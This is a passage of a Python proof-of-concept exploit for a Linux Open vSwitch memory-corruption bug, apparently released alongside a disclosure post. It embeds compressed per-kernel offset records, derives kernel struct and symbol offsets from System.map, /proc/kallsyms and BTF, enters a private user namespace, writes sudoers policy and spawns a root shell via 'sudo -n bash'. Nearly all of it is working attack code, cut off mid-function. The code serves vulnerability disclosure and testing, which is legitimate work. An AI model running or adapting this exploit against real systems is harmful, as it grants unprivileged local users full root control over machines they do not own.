nLV{_1i6tLxgRGVamtctKR>xA?DPBes(7{jSQKTUL$od$M?3=9fISn~zVZax&k*cMJtGa+q5cyPl|;)6BwzzJ6*ge!1KaOkVW$Vk1hzKypR(vI`&R)Qu&J;CJ1^LKSJ-W^>k2zW1=xTM*mR5lc0RDn$sHqQ*Sn+kygOnxX45f(+1bpV+A)IM$c^0O*~mSc+|xTov`rl&;#e~R*nmx*4cK|X-v69f3+yuLDq8Yvzy@q8Y{1S3c9^!vuL0ZDA5ojAsjvYXu&J;CJ15wad$JSQHY!7f4cLH9#|U8O1iPBtF;aECI|}cPn2p(Vj9_*?v!`~9AUAR&H+eR4&nEY({tewP&wh1&wv9(ZAvzi#oh2RtY`_L=z|IP`-Lu8-YO@8qs*O&U#2j~N02{CY8?f_&?WXl)i%ui!PND{Ezy@qOMgTh}*s_g8?4(FUqA^j3L;xGG=K@<g9w`C)Ie=~V9HMDOBF%Aida?l<umKyeGlT7>O+9WS5u+JX2W-H;1-9-1+p91DcG=Omcc;HEhz^w<mtlMVwPx72jIO^&`ytZ@YISksSHJ)IWiur&ug;3XrGhi9jm9th!moD08M^zELr33otKcmCh=NmDrJk8z_Y2NlqLp7HTKY%mB%1bV4~1yD3J`4u(ON(M75pQ#%JPrUrY`AR`yY*aCoXibrJ}1~DgOwq4`iiR$D3c)SErX>_7Bf5uTG0X3gu$`;XYplEdE?o@{0~f3|oLUWoTZst18%Wqs@vjx#gg3CXP1Ozry_ixpJiivoRa9Gn#FxN~thzv{^#H?8TWqZL}G=ksG-mBlPuNmCnh+Lto_XkbD1Cov+uI+n~hOe@l;Iqp8TW0UNLZ8?dv2t@j^oPGD<WsHQE9<F0@W*t3Cc{J6G?(vxQ|3GBUhE8nTGRn!95fDPDy4cJ-1*85M&wJPkiKM1e^8?cE)06QDlc6x@bL#nWwVL8ACY`_L=z|IP`Ov|v-XtRsfM4`e4Y`_L=z|ITyp8J&lu{qv?Eom2pxM-N=25i74!v^e}VDG)2^LB+TmI@oN0UNLZJ2%*SuIId0Vbj(J*z6XW1#FShRetw+&a@!3s<^<tB(Q&7UmS1FHphCUKmGeJdU^b7dUkB&POC+9h}I^%zezXUN5TDH|NFoGe|8h;EC")
# END EMBEDDED KERNEL RECORDS


def uname_a() -> str:
    uname = os.uname()
    return " ".join(
        (
            uname.sysname,
            uname.nodename,
            uname.release,
            uname.version,
            uname.machine,
        )
    )


def acknowledge_unknown_kernel() -> None:
    print(
        "This is a memory-corruption-based PoC -- it requires per-kernel-build "
        "derived values (offsets, etc.). These were pre-derived for a number of "
        "kernels in this single-file PoC, but yours is NOT among "
        f"them: {uname_a()}.\n\n"
        "Therefore, the PoC will attempt to _dynamically derive_ the offsets, "
        "etc., from readable local System.map files or nonzero /proc/kallsyms "
        "for symbol offsets; readable /sys/kernel/btf/* files or unstripped "
        "local kernel build objects via pahole for struct layouts; and loaded "
        "/sys/kernel/btf/openvswitch module BTF for "
        "OVS_KEY_ATTR_TUNNEL_INFO. These are often available to unprivileged "
        "users across distros, but the availability depends on various "
        "security settings. If they are NOT available, the PoC will report "
        "this and terminate. (Note: pahole must be already installed for the "
        "dynamic derivation; an actual attacker would just package it in the "
        "PoC).\n\n"
        "By proceeding, you acknowledge that such early termination would NOT "
        "imply your kernel is not affected, since your kernel could still be "
        "vulnerable despite these sources not being reachable by an "
        "unprivileged attacker; an unprivileged attacker could still trivially "
        "target the PoC at your kernel by obtaining the symbols in a myriad of "
        "other ways (e.g., matching distro debuginfo/kernel-devel packages, "
        "System.map/vmlinux/BTF from the vendor kernel package, a second "
        "machine running the same kernel build, rebuilding the same "
        "source/config locally, public distro debug repositories, or any "
        "privileged read of the target's symbol/debug files).\n\n"
        "For a definitive check of whether you are affected, see "
        "https://heyitsas.im/posts/ovswrap",
        flush=True,
    )
    try:
        answer = input("Acknowledge? [Y/N]: ")
    except EOFError as exc:
        raise RuntimeError(
            "terminated: no Y/N acknowledgement was received for dynamic "
            "derivation on an uncovered kernel"
        ) from exc
    if answer.strip().lower() == "y":
        return
    raise RuntimeError(
        "terminated: user refused to acknowledge that dynamic-derivation "
        "failure on an uncovered kernel would not imply non-affectation"
    )

def require_pahole_for_dynamic_derivation() -> None:
    if shutil.which("pahole") is None:
        raise RuntimeError(
            "kernel is not covered by pre-derived kernel records, and pahole is "
            "required to dynamically derive kernel struct offsets from local "
            "debug info. This does NOT mean you are not affected, as a real "
            "attacker would just package the equivalent functionality into "
            "the PoC or otherwise target the PoC at this kernel. For a "
            "definitive check of whether you are affected, see "
            "https://heyitsas.im/posts/ovswrap"
        )


def json_object(value: Any, source: str) -> dict[str, Any]:
    if not isinstance(value, dict):
        raise RuntimeError(f"{source}: expected a JSON object")
    return value


def json_int(obj: dict[str, Any], field: str, source: str) -> int:
    value = obj.get(field)
    if not isinstance(value, int) or isinstance(value, bool):
        raise RuntimeError(f"{source}: {field} must be an integer")
    return value


def json_str(obj: dict[str, Any], field: str, source: str) -> str:
    value = obj.get(field)
    if not isinstance(value, str):
        raise RuntimeError(f"{source}: {field} must be a string")
    return value


def json_str_tuple(obj: dict[str, Any], field: str, source: str) -> tuple[str, ...]:
    value = obj.get(field)
    if not isinstance(value, list) or not all(isinstance(item, str) for item in value):
        raise RuntimeError(f"{source}: {field} must be a string list")
    return tuple(value)


def json_carrier(obj: dict[str, Any], field: str, source: str) -> str:
    value = json_str(obj, field, source)
    if value not in CARRIER_ORDER:
        raise RuntimeError(f"{source}: {field} has unknown carrier {value!r}")
    return value


def parse_kernel_offsets(value: Any, source: str) -> KernelOffsets:
    obj = json_object(value, source)
    values: dict[str, Any] = {}
    for kernel_field in fields(KernelOffsets):
        if kernel_field.name == "dst_entry_ref_kind":
            values[kernel_field.name] = json_str(obj, kernel_field.name, source)
        else:
            values[kernel_field.name] = json_int(obj, kernel_field.name, source)
    ref_kind = values["dst_entry_ref_kind"]
    if ref_kind not in ("__rcuref", "__refcnt"):
        raise RuntimeError(f"{source}: invalid dst_entry_ref_kind={ref_kind!r}")
    return KernelOffsets(**values)


def parse_kernel_build_record(value: Any, source: str) -> KernelBuildRecord:
    obj = json_object(value, source)
    return KernelBuildRecord(
        release=json_str(obj, "release", source),
        version=json_str(obj, "version", source),
        machine=json_str(obj, "machine", source),
        offsets=parse_kernel_offsets(obj.get("offsets"), f"{source}.offsets"),
        read_carrier=json_carrier(obj, "read_carrier", source),
        write_carrier=json_carrier(obj, "write_carrier", source),
        read_lanes=json_str_tuple(obj, "read_lanes", source),
        ovs_key_attr_tunnel_info=json_int(obj, "ovs_key_attr_tunnel_info", source),
    )


def load_kernel_build_records() -> tuple[KernelBuildRecord, ...]:
    source = KERNEL_RECORDS_DESCRIPTION
    try:
        encoded = base64.b85decode(_KERNEL_RECORDS_B85)
        value = json.loads(zlib.decompress(encoded))
    except (ValueError, zlib.error, json.JSONDecodeError) as exc:
        raise RuntimeError(f"{source} is malformed: {exc}") from exc

    if not isinstance(value, list):
        raise RuntimeError(f"{source}: expected a JSON array")
    return tuple(
        parse_kernel_build_record(item, f"{source}[{index}]")
        for index, item in enumerate(value)
    )


def parse_attrs(buf: bytes) -> list[Attr]:
    attrs: list[Attr] = []
    offset = 0
    while offset + 4 <= len(buf):
        length, attr_type = struct.unpack_from(NLA_HDR, buf, offset)
        if length < 4 or length > len(buf) - offset:
            break
        attrs.append(Attr(attr_type, buf[offset + 4 : offset + length], length))
        offset += align4(length)
    return attrs


class GenericNetlink:
    def __init__(self) -> None:
        self.sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
        self.sock.bind((0, 0))
        self.seq = 1

    def request(
        self,
        nlmsg_type: int,
        cmd: int,
        version: int,
        payload: bytes = b"",
        flags: int = NLM_F_REQUEST | NLM_F_ACK,
    ) -> list[bytes]:
        seq = self.seq
        self.seq += 1
        genl = struct.pack(GENL_HDR, cmd, version, 0)
        message = genl + payload
        header = struct.pack(NLMSG_HDR, 16 + len(message), nlmsg_type, flags, seq, 0)
        self.sock.send(header + message)

        want_ack = bool(flags & NLM_F_ACK)
        replies: list[bytes] = []
        while True:
            data = self.sock.recv(1 << 20)
            offset = 0
            while offset + 16 <= len(data):
                length, msg_type, _msg_flags, rseq, _pid = struct.unpack_from(
                    NLMSG_HDR, data, offset
                )
                if rseq != seq:
                    offset += align4(length)
                    continue
                body = data[offset + 16 : offset + length]
                if msg_type == NLMSG_ERROR:
                    error = struct.unpack_from("i", body, 0)[0]
                    if error == 0:
                        return replies
                    raise OSError(-error, os.strerror(-error))
                replies.append(body)
                offset += align4(length)
            if replies and not want_ack:
                return replies

    def get_family(self, name: str) -> int:
        replies = self.request(
            GENL_ID_CTRL,
            CTRL_CMD_GETFAMILY,
            2,
            nla(CTRL_ATTR_FAMILY_NAME, cstr(name)),
            NLM_F_REQUEST,
        )
        for reply in replies:
            for attr in parse_attrs(reply[4:]):
                if attr.attr_type == CTRL_ATTR_FAMILY_ID:
                    return int(struct.unpack_from("H", attr.payload, 0)[0])
        raise RuntimeError(f"family {name} id not found")


def run_text(command: list[str]) -> str:
    result = subprocess.run(command, text=True, capture_output=True, check=False)
    return (result.stdout + result.stderr).strip()


def step(message: str) -> None:
    print(f"\n***{message}***", flush=True)


def log(message: str) -> None:
    print(message, flush=True)


def strip_c_comments(text: str) -> str:
    text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
    return re.sub(r"//.*", "", text)


def parse_btf_enum_value(
    btf_path: str, enum_name: str, constant_name: str
) -> int | None:
    pahole = shutil.which("pahole")
    if pahole is not None and os.access(btf_path, os.R_OK):
        commands = [[pahole, "-C", enum_name, btf_path]]
        base = os.path.join(os.path.dirname(btf_path), "vmlinux")
        if os.path.basename(btf_path) != "vmlinux" and os.access(base, os.R_OK):
            commands.append([pahole, f"--btf_base={base}", "-C", enum_name, btf_path])
        for command in commands:
            result = subprocess.run(
                command,
                text=True,
                capture_output=True,
                check=False,
            )
            if result.returncode == 0:
                value = parse_enum_from_text(result.stdout, enum_name, constant_name)
                if value is not None:
                    return value
    return None


def path_state(path: str) -> str:
    if not os.path.exists(path):
        return f"{path} (missing)"
    if not os.path.isfile(path):
        return f"{path} (not a regular file)"
    if not os.access(path, os.R_OK):
        return f"{path} (not readable)"
    return f"{path} (readable)"


def summarize_path_states(paths: list[str], limit: int = 14) -> str:
    if not paths:
        return "no candidate paths were configured"
    entries = [path_state(path) for path in paths[:limit]]
    if len(paths) > limit:
        entries.append(f"... {len(paths) - limit} more candidate paths omitted")
    return "; ".join(entries)


def parse_enum_from_text(text: str, enum_name: str, constant_name: str) -> int | None:
    text = strip_c_comments(text)
    match = re.search(rf"enum\s+{re.escape(enum_name)}\s*\{{(.*?)\}};", text, re.S)
    if not match:
        return None
    value = 0
    for raw_entry in match.group(1).split(","):
        entry = raw_entry.strip()
        if not entry:
            continue
        name, sep, explicit = entry.partition("=")
        name = name.strip()
        if sep:
            explicit_value = explicit.strip()
            if not re.fullmatch(r"0x[0-9A-Fa-f]+|[0-9]+", explicit_value):
                return None
            value = int(explicit_value, 0)
        if name == constant_name:
            return value
        value += 1
    return None


def derive_ovs_uapi_constants(record: KernelBuildRecord | None) -> None:
    global OVS_KEY_ATTR_TUNNEL_INFO

    if record is not None:
        OVS_KEY_ATTR_TUNNEL_INFO = record.ovs_key_attr_tunnel_info
        log(
            "UAPI: using pre-derived OVS_KEY_ATTR_TUNNEL_INFO="
            f"{OVS_KEY_ATTR_TUNNEL_INFO}"
        )
        return

    btf_path = f"{BTF_DIR}/openvswitch"
    tunnel_info = parse_btf_enum_value(
        btf_path, "ovs_key_attr", "OVS_KEY_ATTR_TUNNEL_INFO"
    )
    if tunnel_info is None:
        raise RuntimeError(
            "kernel is not covered by pre-derived kernel records, and this user "
            f"could not derive OVS_KEY_ATTR_TUNNEL_INFO from {btf_path}. "
            f"Checked: {path_state(btf_path)}"
        )
    if tunnel_info != OVS_KEY_ATTR_TUNNEL_INFO:
        log(
            "UAPI: OVS_KEY_ATTR_TUNNEL_INFO="
            f"{tunnel_info} from {btf_path} "
            f"(fallback was {OVS_KEY_ATTR_TUNNEL_INFO})"
        )
    OVS_KEY_ATTR_TUNNEL_INFO = tunnel_info


def checked_binary(name: str) -> str:
    if name == "sudo":
        wrapper = "/run/wrappers/bin/sudo"
        if os.access(wrapper, os.X_OK):
            return wrapper
    path = shutil.which(name)
    if path is None:
        raise RuntimeError(f"required command not found in PATH: {name}")
    return path


def optional_binary(name: str) -> str | None:
    return shutil.which(name)


def uid_map_first_entry() -> tuple[int, int, int, str]:
    with open("/proc/self/uid_map", "r", encoding="ascii") as handle:
        first_line = handle.readline().strip()
    fields = first_line.split()
    if len(fields) < 3:
        raise RuntimeError(f"unexpected uid_map format: {first_line!r}")
    return int(fields[0]), int(fields[1]), int(fields[2]), first_line


def process_status_line(prefix: str) -> str:
    with open("/proc/self/status", "r", encoding="ascii") as handle:
        for line in handle:
            if line.startswith(prefix):
                return line.strip()
    raise RuntimeError(f"/proc/self/status did not contain {prefix!r}")


def effective_capability_mask() -> int:
    line = process_status_line("CapEff:")
    fields = line.split()
    if len(fields) != 2:
        raise RuntimeError(f"unexpected CapEff line: {line!r}")
    return int(fields[1], 16)


def launching_user() -> tuple[int, int, str]:
    uid = os.getuid()
    gid = os.getgid()
    if uid == 0 or os.geteuid() == 0:
        raise RuntimeError(
            "refusing to run as root. Run this PoC directly as an ordinary "
            "non-sudo local user."
        )
    if effective_capability_mask() != 0:
        raise RuntimeError(
            "refusing to run with preexisting effective capabilities. Run this "
            "PoC as an ordinary unprivileged user."
        )
    try:
        username = pwd.getpwuid(uid).pw_name
    except KeyError:
        raise RuntimeError(f"uid {uid} has no passwd entry") from None
    return uid, gid, username


def ensure_user_starts_without_passwordless_sudo(username: str) -> None:
    step("CHECKING BASELINE SUDO ACCESS")
    sudo = checked_binary("sudo")
    result = subprocess.run(
        [sudo, "-n", "true"],
        text=True,
        capture_output=True,
        check=False,
    )
    detail = (result.stderr or result.stdout).strip()
    if result.returncode == 0:
        raise RuntimeError(
            f"refusing to run: user {username!r} already has passwordless sudo. "
            "Use a non-sudo ordinary user so the root-shell delta is meaningful."
        )
    print(f"baseline passwordless sudo for {username}: denied", flush=True)
    if detail:
        print(f"sudo denial detail: {detail.splitlines()[0]}", flush=True)


def spawn_root_shell(username: str) -> None:
    step("SPAWNING ROOT SHELL")
    sudo = checked_binary("sudo")
    shell = shutil.which("bash") or "/bin/bash"
    if not os.path.exists(shell):
        raise RuntimeError(f"root shell path missing: {shell}")
    print(
        f"RESULT: sudoers policy write achieved; spawning 'sudo -n {shell}' as "
        f"{username}",
        flush=True,
    )
    try:
        result = subprocess.run([sudo, "-n", shell], check=False)
    except OSError as exc:
        raise RuntimeError(
            f"failed to spawn root shell through sudo: errno={exc.errno} "
            f"{exc.strerror}"
        ) from exc
    if result.returncode != 0:
        raise RuntimeError(f"root shell exited with status {result.returncode}")
    print(
        "root shell exited; namespace pin process remains alive to avoid unsafe "
        "OVS teardown",
        flush=True,
    )


def namespace_prefix_works(prefix: list[str], env: dict[str, str]) -> tuple[bool, str]:
    probe = prefix + [
        sys.executable,
        "-c",
        "import os,sys; sys.exit(0 if os.geteuid() == 0 else 1)",
    ]
    try:
        result = subprocess.run(
            probe,
            env=env,
            text=True,
            capture_output=True,
            check=False,
            timeout=60,
        )
    except subprocess.TimeoutExpired:
        return False, "namespace probe timed out after 60 seconds"
    if result.returncode == 0:
        return True, ""
    detail = (result.stderr or result.stdout).strip()
    return False, detail.splitlines()[0] if detail else "<no output>"


def private_namespace_prefix(env: dict[str, str]) -> list[str]:
    unshare = checked_binary("unshare")
    direct = [unshare, "-Urn"]
    works, detail = namespace_prefix_works(direct, env)
    if works:
        log("namespace: direct unshare -Urn works")
        return direct
    log(f"namespace: direct unshare -Urn failed: {detail}")
    aa_exec = optional_binary("aa-exec")
    if aa_exec is None:
        raise RuntimeError(
            "direct unshare -Urn failed and aa-exec is not available for the "
            "AppArmor trinity fallback"
        )
    aa_prefix = [aa_exec, "-p", "trinity", "--", unshare, "-Urn"]
    log("namespace: trying aa-exec -p trinity -- unshare -Urn fallback")
    works, aa_detail = namespace_prefix_works(aa_prefix, env)
    if works:
        log("namespace: aa-exec -p trinity fallback works")
        return aa_prefix
    raise RuntimeError(
        "could not enter a private root-mapped user+network namespace. "
        f"direct unshare failed with: {detail}; aa-exec fallback failed with: "
        f"{aa_detail}"
    )


def run_child_in_private_namespace(
    host_user: str,
    writer_pid: int,
    writer_trigger_fd: int,
    writer_ack_fd: int,
) -> None:
    step("ENTERING PRIVATE USER AND NETWORK NAMESPACES")
    script = os.path.abspath(sys.argv[0])
    env = os.environ.copy()
    env[HOST_USER_ENV] = host_user
    env[HOST_WRITER_PID_ENV] = str(writer_pid)
    env[HOST_WRITER_TRIGGER_FD_ENV] = str(writer_trigger_fd)
    env[HOST_WRITER_ACK_FD_ENV] = str(writer_ack_fd)
    prefix = private_namespace_prefix(env)
    command = prefix + [sys.executable, script, "--child"]
    print(f"running child: {' '.join(command)}", flush=True)
    success = False
    try:
        completed = subprocess.run(
            command,
            env=env,
            check=False,
            pass_fds=(writer_trigger_fd, writer_ack_fd),
        )
        success = completed.returncode == 0
        if completed.returncode != 0:
            raise RuntimeError(
                f"namespace child failed with exit status {completed.returncode}"
            )
    finally:
        for fd in (writer_trigger_fd, writer_ack_fd):
            try:
                os.close(fd)
            except OSError:
                pass
        if not success:
            try:
                os.waitpid(writer_pid, os.WNOHANG)
            except ChildProcessError:
                pass
    spawn_root_shell(host_user)


def validate_child_namespace() -> str:
    host_user = os.environ.get(HOST_USER_ENV)
    if not host_user:
        raise RuntimeError("missing OVS_C004_HOST_USER from parent process")
    inside_uid, outside_uid, count, first_line = uid_map_first_entry()
    if os.getuid() != 0 or os.geteuid() != 0:
        raise RuntimeError("child is not uid 0 inside the private user namespace")
    if inside_uid != 0 or outside_uid == 0 or count != 1:
        raise RuntimeError(f"unexpected private uid_map format: {first_line!r}")
    return host_user


def inherited_sudoers_writer() -> tuple[int, int, int]:
    raw_pid = os.environ.get(HOST_WRITER_PID_ENV)
    raw_trigger_fd = os.environ.get(HOST_WRITER_TRIGGER_FD_ENV)
    raw_ack_fd = os.environ.get(HOST_WRITER_ACK_FD_ENV)
    if not raw_pid or not raw_trigger_fd or not raw_ack_fd:
        raise RuntimeError("missing inherited host sudoers writer state")
    try:
        writer_pid = int(raw_pid)
        trigger_fd = int(raw_trigger_fd)
        ack_fd = int(raw_ack_fd)
    except ValueError as exc:
        raise RuntimeError("invalid inherited host sudoers writer state") from exc
    for fd, label in ((trigger_fd, "trigger"), (ack_fd, "ack")):
        try:
            os.fstat(fd)
        except OSError as exc:
            raise RuntimeError(
                f"inherited host sudoers writer {label} fd {fd} is invalid: "
                f"errno={exc.errno} {exc.strerror}"
            ) from exc
    return writer_pid, trigger_fd, ack_fd


class BtfResolver:
    def __init__(self, btf_dir: str = BTF_DIR) -> None:
        self.btf_dir = btf_dir
        self._struct_cache: dict[str, tuple[str, str]] = {}
        self.paths = self.candidate_paths()
        self.readable = [
            path
            for path in self.paths
            if os.path.isfile(path) and os.access(path, os.R_OK)
        ]
        if not self.readable:
            raise RuntimeError(
                "kernel is not covered by pre-derived kernel records, and this "
                "user could not find readable local BTF or unstripped kernel "
                "build objects for pahole-based layout derivation. Checked: "
                f"{summarize_path_states(self.paths)}"
            )
        log(f"debug info: found {len(self.readable)} readable pahole source files")

    def candidate_paths(self) -> list[str]:
        ordered: list[str] = []
        seen: set[str] = set()

        def add(path: str) -> None:
            if path in seen:
                return
            seen.add(path)
            ordered.append(path)

        try:
            btf_entries = [
                os.path.join(self.btf_dir, entry)
                for entry in os.listdir(self.btf_dir)
            ]
        except OSError:
            btf_entries = []
        vmlinux_btf = os.path.join(self.btf_dir, "vmlinux")
        add(vmlinux_btf)
        for path in sorted(btf_entries):
            if path != vmlinux_btf:
                add(path)

        release = os.uname().release
        build_dir = f"/lib/modules/{release}/build"
        for path in (
            f"{build_dir}/net/openvswitch/conntrack.o",
            f"{build_dir}/net/openvswitch/openvswitch.o",
            f"{build_dir}/net/netfilter/core.o",
            f"{build_dir}/net/netfilter/nf_conntrack_core.o",
            f"{build_dir}/net/netfilter/nf_conntrack.o",
            f"{build_dir}/net/netfilter/nf_conntrack_ftp.o",
            f"{build_dir}/vmlinux",
            f"/usr/src/linux-{release}/vmlinux",
            f"/usr/lib/debug/boot/vmlinux-{release}",
            f"/usr/lib/debug/lib/modules/{release}/vmlinux",
            f"/usr/lib/debug/vmlinux-{release}",
        ):
            add(path)
        try:
            for entry in sorted(os.listdir("/usr/src")):
                add(os.path.join("/usr/src", entry, "vmlinux"))
        except OSError:
            pass
        return ordered

    def struct_text(self, type_name: str) -> tuple[str, str]:
        cached = self._struct_cache.get(type_name)
        if cached is not None:
            return cached
        errors: list[str] = []
        for path in self.readable:
            commands = [["pahole", "-C", type_name, path]]
            if not path.startswith(self.btf_dir + os.sep):
                commands = [["pahole", "-F", "dwarf", "-C", type_name, path]]
            elif path != os.path.join(self.btf_dir, "vmlinux"):
                commands.append(
                    [
                        "pahole",
                        f"--btf_base={os.path.join(self.btf_dir, 'vmlinux')}",
                        "-C",
                        type_name,
                        path,
                    ]
                )
            for command in commands:
                result = subprocess.run(
                    command,
                    text=True,
                    capture_output=True,
                    check=False,
                )
                if f"struct {type_name}" in result.stdout:
                    log(f"debug info: found struct {type_name} in {path}")
                    found = (path, result.stdout)
                    self._struct_cache[type_name] = found
                    return found
                if result.stderr.strip():
                    errors.append(f"{path}: {result.stderr.strip().splitlines()[-1]}")
        raise RuntimeError(
            f"required debug type struct {type_name} was not found in readable "
            "local BTF or unstripped kernel build objects"
            + (f" (last errors: {'; '.join(errors[-3:])})" if errors else "")
        )

    def field_offset(self, type_name: str, field_name: str) -> int:
        _path, text = self.struct_text(type_name)
        return parse_pahole_field_offset(text, type_name, field_name)

    def struct_size(self, type_name: str) -> int:
        _path, text = self.struct_text(type_name)
        match = re.search(r"/\*\s*size:\s*(\d+),", text)
        if match is None:
            raise RuntimeError(f"could not parse sizeof(struct {type_name}) from pahole output")
        return int(match.group(1))


def parse_pahole_field_offset(text: str, type_name: str, field_name: str) -> int:
    field_pattern = re.compile(
        r"(^|[\s\*\)])" + re.escape(field_name) + r"(\s*(\[|;|\)|__attribute__))"
    )
    for line in text.splitlines():
        if "/*" not in line or not field_pattern.search(line):
            continue
        match = re.search(r"/\*\s*(\d+)\s+\d+\s*\*/", line)
        if match is not None:
            return int(match.group(1))
    raise RuntimeError(f"could not parse {type_name}.{field_name} offset from pahole output")


def parse_symbol_values(path: str) -> tuple[dict[str, int], str | None]:
    values: dict[str, int] = {}
    try:
        with open(path, "r", encoding="ascii", errors="replace") as handle:
            for line in handle:
                fields = line.split()
                if len(fields) < 3 or fields[2] not in REQUIRED_SYMBOLS:
                    continue
                try:
                    values[fields[2]] = int(fields[0], 16)
                except ValueError:
                    continue
    except OSError as exc:
        return values, f"{path} unavailable to this user: {exc.strerror}"
    return values, None


def symbol_offsets_from(path: str) -> tuple[SymbolOffsets | None, str]:
    log(f"symbols: trying {path}")
    values, error = parse_symbol_values(path)
    if error is not None:
        log(f"symbols: {error}")
        return None, error
    missing = [name for name in REQUIRED_SYMBOLS if name not in values]
    if missing:
        names = ", ".join(missing)
        log(f"symbols: {path} missing required symbols: {names}")
        return None, f"{path} readable but missing {names}"
    zeroed = [name for name in REQUIRED_SYMBOLS if values[name] == 0]
    if zeroed:
        names = ", ".join(zeroed)
        log(f"symbols: {path} has zeroed required symbols: {names}")
        return None, f"{path} readable but zeroed {names}"
    base = values[KERNEL_BASE_SYMBOL]
    module_ktype = values["module_ktype"] - base
    init_pid_ns = values["init_pid_ns"] - base
    if module_ktype <= 0 or init_pid_ns <= 0:
        log(f"symbols: {path} produced invalid offsets from {KERNEL_BASE_SYMBOL}")
        return None, f"{path} readable but produced invalid symbol offsets"
    log(
        f"symbols: using {path}; module_ktype_offset=0x{module_ktype:x} "
        f"init_pid_ns_offset=0x{init_pid_ns:x}"
    )
    return SymbolOffsets(module_ktype, init_pid_ns), ""


def local_symbol_candidate_paths(release: str) -> list[str]:
    candidates = [
        f"/boot/System.map-{release}",
        "/boot/System.map",
        "/proc/kallsyms",
        f"/usr/lib/debug/boot/System.map-{release}",
        f"/lib/modules/{release}/build/System.map",
        f"/usr/src/linux-{release}/System.map",
        f"/usr/src/kernels/{release}/System.map",
    ]
    try:
        with open(
            "/usr/src/linux/include/config/kernel.release",
            "r",
            encoding="ascii",
            errors="replace",
        ) as handle:
            if handle.read().strip() == release:
                candidates.append("/usr/src/linux/System.map")
    except OSError:
        pass
    ordered: list[str] = []
    seen: set[str] = set()
    for path in candidates:
        if path in seen:
            continue
        seen.add(path)
        ordered.append(path)
    return ordered


def lookup_kernel_build_record() -> KernelBuildRecord | None:
    uname = os.uname()
    records = load_kernel_build_records()
    release_matches = [
        record for record in records if record.release == uname.release
    ]
    exact_matches = [
        record
        for record in release_matches
        if record.version == uname.version and record.machine == uname.machine
    ]
    if exact_matches:
        record = exact_matches[0]
        log(
            "kernel lookup: using pre-derived record for "
            f"release={record.release} version={record.version!r}"
        )
        return record
    if release_matches:
        log(
            "kernel lookup: release is covered but this exact build is not: "
            f"release={uname.release} version={uname.version!r} "
            f"machine={uname.machine}"
        )
        return None
    log(
        "kernel lookup: no pre-derived record for "
        f"release={uname.release} version={uname.version!r} machine={uname.machine}; "
        "will try local System.map/kallsyms and BTF derivation. This kernel is "
        "not covered by our validation table."
    )
    return None


def derive_symbol_offsets() -> SymbolOffsets:
    release = os.uname().release
    failures: list[str] = []
    for path in local_symbol_candidate_paths(release):
        offsets, failure = symbol_offsets_from(path)
        if offsets is not None:
            return offsets
        failures.append(failure)
    raise RuntimeError(
        "kernel is not covered by pre-derived kernel records, and this user "
        "could not derive module_ktype/init_pid_ns from local System.map or "
        "nonzero /proc/kallsyms locations. Checked: "
        + (
            "; ".join(failures)
            if failures
            else "no candidate symbol paths were configured"
        )
    )


def derive_kernel_offsets(btf: BtfResolver, symbols: SymbolOffsets) -> KernelOffsets:
    module_mkobj = btf.field_offset("module", "mkobj")
    module_kobject_kobj = btf.field_offset("module_kobject", "kobj")
    kobject_ktype = btf.field_offset("kobject", "ktype")
    ovs_conntrack_info_size = btf.struct_size("ovs_conntrack_info")
    ovs_ct_labels = btf.field_offset("ovs_conntrack_info", "labels")
    ip_tunnel_info_key = btf.field_offset("ip_tunnel_info", "key")
    try:
        dst_entry_ref = btf.field_offset("dst_entry", "__rcuref")
        dst_entry_ref_kind = "__rcuref"
    except RuntimeError:
        dst_entry_ref = btf.field_offset("dst_entry", "__refcnt")
        dst_entry_ref_kind = "__refcnt"
    offsets = KernelOffsets(
        nf_conntrack_helper_me=btf.field_offset("nf_conntrack_helper", "me"),
        module_kobj_ktype=module_mkobj + module_kobject_kobj + kobject_ktype,
        vmlinux_module_ktype=symbols.module_ktype,
        vmlinux_init_pid_ns=symbols.init_pid_ns,
        task_pid=btf.field_offset("task_struct", "pid"),
        task_cred=btf.field_offset("task_struct", "cred"),
        task_pid_links=btf.field_offset("task_struct", "pid_links"),
        cred_fsuid=btf.field_offset("cred", "fsuid"),
        cred_fsgid=btf.field_offset("cred", "fsgid"),
        cred_cap_permitted=btf.field_offset("cred", "cap_permitted"),
        cred_cap_effective=btf.field_offset("cred", "cap_effective"),
        pid_namespace_idr=btf.field_offset("pid_namespace", "idr"),
        idr_idr_rt=btf.field_offset("idr", "idr_rt"),
        idr_base=btf.field_offset("idr", "idr_base"),
        xarray_xa_head=btf.field_offset("xarray", "xa_head"),
        xa_node_shift=btf.field_offset("xa_node", "shift"),
        xa_node_slots=btf.field_offset("xa_node", "slots"),
        pid_tasks=btf.field_offset("pid", "tasks"),
        hlist_head_first=btf.field_offset("hlist_head", "first"),
        dst_entry_ref=dst_entry_ref,
        dst_entry_ref_kind=dst_entry_ref_kind,
        metadata_dst_tun_info=btf.field_offset("metadata_dst", "u"),
        ip_tunnel_key_ipv4_src=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "src"),
        ip_tunnel_key_ipv4_dst=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "dst"),
        ip_tunnel_key_tos=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "tos"),
        ip_tunnel_key_ttl=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "ttl"),
        ip_tunnel_key_tp_src=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "tp_src"),
        ip_tunnel_key_tp_dst=ip_tunnel_info_key
        + btf.field_offset("ip_tunnel_key", "tp_dst"),
        ovs_ct_labels=ovs_ct_labels,
        ovs_ct_action_len=NLA_HEADER_SIZE + ovs_conntrack_info_size,
    )
    log("kernel offsets: derived from local symbols and debug type info")
    return offsets


def current_kernel_parameters() -> tuple[KernelOffsets, KernelBuildRecord | None]:
    record = lookup_kernel_build_record()
    if record is not None:
        log("kernel offsets: using pre-derived values")
        derive_ovs_uapi_constants(record)
        return record.offsets, record

    acknowledge_unknown_kernel()
    require_pahole_for_dynamic_derivation()
    try:
        symbols = derive_symbol_offsets()
        btf = BtfResolver()
        offsets = derive_kernel_offsets(btf, symbols)
        derive_ovs_uapi_constants(None)
        return offsets, None
    except RuntimeError as exc:
        reason = str(exc).strip().rstrip(".")
        raise RuntimeError(
            "Your kernel was not found in the embedded pre-derived record table and "
            f"dynamic derivation failed because {reason}. As mentioned "
            "before, this does NOT guarantee you are not affected. For a "
            "definitive check of whether you are affected, see "
            "https://heyitsas.im/posts/ovswrap"
        ) from exc


def create_datapath(genl: GenericNetlink, family_id: int, name: str) -> None:
